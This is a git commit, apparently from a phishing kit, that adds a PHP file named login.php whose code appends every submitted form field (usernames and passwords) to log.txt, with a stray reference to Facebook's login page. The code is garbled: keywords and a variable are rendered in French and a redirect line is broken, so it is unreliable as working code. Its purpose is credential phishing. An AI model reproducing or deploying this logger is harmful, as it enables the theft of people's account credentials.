8bb5eb9efb87173a19832a9c763dd617ef2f1b87
Dx-fantome-hack <dxfantome7@gmail.com>
2024-10-01 23:43:43 +0100

    Update and rename -00 to login.php

---
+++ login.php
@@ -0,0 +1,13 @@
+<?php 
+http://facebook.com/login.php);
+$handle = fopen("log.txt", "a");
+foreach($_POST comme $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($poignée);
+sortie;
+?>
